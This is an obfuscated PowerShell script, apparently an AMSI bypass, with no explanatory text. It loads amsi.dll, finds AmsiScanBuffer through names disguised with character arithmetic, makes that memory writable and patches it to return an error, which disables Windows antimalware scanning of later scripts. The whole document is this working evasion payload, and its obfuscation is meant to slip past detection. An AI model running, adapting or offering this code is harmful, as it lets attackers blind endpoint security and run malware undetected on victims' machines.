$l4q = @"
using System;
using System.Runtime.InteropServices;
public class l4q {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr uXnyVBwkpWJk, string E8dG9SCKBaNB1P7R7Z_);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr _xAZk51yYhpPugjow2, UIntPtr wbrviIJcmt, uint h2eRXigID4X5OM_ksY, out uint UPNSLu);
}
"@

Add-Type $l4q

$cEAMTp7Xozxuu8 = [l4q]::LoadLibrary("$([chaR](37+60)+[CHAR]([ByTe]0x6d)+[CHAR]([BYte]0x73)+[chAR](64+41)+[char](26+20)+[CHar](100)+[cHaR](108*17/17)+[cHar](108*73/73))")
$YD11nj = [l4q]::GetProcAddress($cEAMTp7Xozxuu8, "$(('ÁmsîScânBû'+'ffêr').nORMalizE([cHaR](58+12)+[ChaR](111*26/26)+[ChaR]([bytE]0x72)+[ChAR](109)+[cHAR]([ByTE]0x44)) -replace [CHaR]([byTe]0x5c)+[chAR]([bYTE]0x70)+[cHar](51+72)+[cHaR](69+8)+[CHAr]([bYTE]0x6e)+[ChAr](125+29-29))")
$p = 0
[l4q]::VirtualProtect($YD11nj, [uint32]5, 0x40, [ref]$p)
$b0R5FsRKZMk = "0xB8"
$U8dzE2KMJDp8ZXLCP = "0x57"
$x_Oktwho = "0x00"
$rcg4Z_yn4slBX0H = "0x07"
$E2LgaZSiMTiPw = "0x80"
$MZyDzcIAfvtj = "0xC3"
$iskTW4825jdPImnZV1 = [Byte[]] ($b0R5FsRKZMk,$U8dzE2KMJDp8ZXLCP,$x_Oktwho,$rcg4Z_yn4slBX0H,+$E2LgaZSiMTiPw,+$MZyDzcIAfvtj)
[System.Runtime.InteropServices.Marshal]::Copy($iskTW4825jdPImnZV1, 0, $YD11nj, 6)